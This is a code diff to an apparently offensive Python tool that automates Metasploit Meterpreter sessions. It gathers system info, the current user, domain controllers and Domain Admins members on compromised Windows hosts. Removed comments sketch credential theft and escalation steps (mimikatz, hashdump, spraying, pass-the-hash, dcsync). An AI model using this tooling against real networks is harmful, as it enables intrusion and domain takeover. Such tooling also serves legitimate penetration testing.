@@ -88,7 +88,7 @@ def get_local_ip(iface):
 
 async def get_shell_info(client, sess_num):
     sysinfo_cmd = 'sysinfo'
-    sysinfo_end_str = b'Meterpreter     : '
+    sysinfo_end_str = [b'Meterpreter     : ']
 
     sysinfo_output = await run_session_cmd(client, sess_num, sysinfo_cmd, sysinfo_end_str)
     # Catch error
@@ -100,7 +100,7 @@ async def get_shell_info(client, sess_num):
         sysinfo_split = sysinfo_utf8_out.splitlines()
 
     getuid_cmd = 'getuid'
-    getuid_end_str = b'Server username:'
+    getuid_end_str = [b'Server username:']
 
     getuid_output = await run_session_cmd(client, sess_num, getuid_cmd, getuid_end_str)
     # Catch error
@@ -225,15 +225,17 @@ async def is_admin(client, sess_num):
 
 async def get_domain_controllers(client, sess_num):
     global DOMAIN_DATA
+    global NEW_SESS_DATA
 
     print_info('Getting domain controller...', sess_num)
     cmd = 'run post/windows/gather/enum_domains'
-    end_str = b'[+] Domain Controller:'
+    end_str = [b'[+] Domain Controller:']
 
     output = await run_session_cmd(client, sess_num, cmd, end_str)
     # Catch timeout
     if type(output) == str:
-        DOMAIN_DATA['error'].append(sess_num)
+        NEW_SESS_DATA[sess_num][b'error'] = output
+        return
 
     output = output.decode('utf8')
     if 'Domain Controller: ' in output:
@@ -244,15 +246,16 @@ async def get_domain_controllers(client, sess_num):
 
 async def get_domain_admins(client, sess_num, ran_once):
     global DOMAIN_DATA
+    global NEW_SESS_DATA
 
     print_info('Getting domain admins...', sess_num)
     cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
-    end_str = b'[+] User list'
+    end_str = [b'[+] User list']
 
     output = await run_session_cmd(client, sess_num, cmd, end_str)
     # Catch timeout
     if type(output) == str:
-        DOMAIN_DATA['error'].append(sess_num)
+        NEW_SESS_DATA[sess_num][b'error'] = output
         return
 
     output = output.decode('utf8')
@@ -305,60 +308,6 @@ def update_session(session, sess_num):
     else:
         NEW_SESS_DATA[sess_num] = session
 
-async def gather_passwords(client, sess_num):
-    #mimikatz
-    #mimikittenz
-    #hashdump
-    pass
-
-async def attack(client, sess_num):
-
-    # Make sure it got the admin_shell info added
-    #if b'admin_shell' in NEW_SESS_DATA[sess_num]:
-
-    # Is admin
-    if NEW_SESS_DATA[sess_num][b'admin_shell'] == b'True':
-        # mimikatz, spray, PTH RID 500 
-        await gather_passwords(client, sess_num)
-
-    elif NEW_SESS_DATA[sess_num][b'admin_shell'] == b'False':
-        if NEW_SESS_DATA[sess_num][b'local_admin'] == b'True':
-            # Getsystem > mimikatz, spray, PTH rid 500
-            pass
-        if NEW_SESS_DATA[sess_num][b'local_admin'] == b'False':
-            # Give up
-            pass
-
-    # START ATTACKING! FINALLY!
-    # not domain joined and not admin
-        # fuck it?
-    # not domain joined but admin
-        # mimikatz
-    # domain joined and not admin
-        # GPP privesc
-        # Check for seimpersonate
-        # Check for dcsync
-        # userhunter
-        # spray and pray
-    # domain joined and admin
-        # GPP
-        # userhunter
-        # spray and pray
-
-
-async def attack_with_session(client, session, sess_num):
-    ''' Attacks with a session '''
-    update_session(session, sess_num)
-
-    # Get and print session info if first time we've checked the session
-    #asyncio.ensure_future(sess_first_check(client, sess_num))
-    task = await sess_first_check(client, sess_num)
-    if task:
-        await asyncio.wait(task)
-
-    if is_session_broken(sess_num) == False:
-        await attack(client, sess_num)
-
 def get_output(client, cmd, sess_num):
     output = client.call('session.meterpreter_read', [str(sess_num)])
 
@@ -381,7 +330,8 @@ def get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs):
                      b'error in script', 
                      b'operation failed', 
                      b'unknown command', 
-                     b'operation timed out']
+                     b'operation timed out',
+                     b'unknown session id']
 
     # Got an error from output
     if any(x in output.lower() for x in script_errors):
@@ -398,7 +348,7 @@ def get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs):
     # No output but we haven't reached timeout yet
     return output, counter
 
-async def run_session_cmd(client, sess_num, cmd, end_str, timeout=30):
+async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
     ''' Will only return a str if we failed to run a cmd'''
     global NEW_SESS_DATA
 
@@ -435,8 +385,8 @@ async def run_session_cmd(client, sess_num, cmd, end_str, timeout=30):
                     return output
 
                 # Successfully completed
-                if end_str:
-                    if end_str in output:
+                if end_strs:
+                    if any(end_str in output for end_str in end_strs):
                         NEW_SESS_DATA[sess_num][b'busy'] = b'False'
                         return output
                 # If no end_str specified just return once we have any data
@@ -479,13 +429,13 @@ def is_session_broken(sess_num):
 
     if b'error' in NEW_SESS_DATA[sess_num]:
         # Session timed out on initial sysinfo cmd
-        if b'domain' not in NEW_SESS_DATA:
+        if b'domain' not in NEW_SESS_DATA[sess_num]:
             return True
         # Session abruptly died
-        elif NEW_SESS_DATA[s][b'error'] == b'exception below likely due to abrupt death of session':
+        if NEW_SESS_DATA[sess_num][b'error'] == b'exception below likely due to abrupt death of session':
             return True
         # Session timed out
-        elif 'Rex::TimeoutError' in NEW_SESS_DATA[s][b'error']:
+        if 'Rex::TimeoutError' in NEW_SESS_DATA[sess_num][b'error']:
             return True
 
     return False
@@ -514,6 +464,27 @@ async def check_for_sessions(client, loop):
                 asyncio.ensure_future(attack_with_session(client, sessions[s], s))
 
         await asyncio.sleep(1)
+
+async def do_stuff_with_meterpreter(client, sess_num):
+    ''' Do stuff with each session here '''
+    ######################################
+    #           YOUR CODE HERE           #
+    ######################################
+
+async def attack_with_session(client, session, sess_num):
+    ''' Attacks with a session '''
+    update_session(session, sess_num)
+
+    # Get and print session info if first time we've checked the session
+    #asyncio.ensure_future(sess_first_check(client, sess_num))
+    task = await sess_first_check(client, sess_num)
+    if task:
+        await asyncio.wait(task)
+
+    if is_session_broken(sess_num) == False:
+        print('are we here yet 2')
+        # THIS IS WHERE YOU CAN DO STUFF WITH EACH SESSION
+        await do_stuff_with_meterpreter(client, sess_num)
 
 def main(args):
 
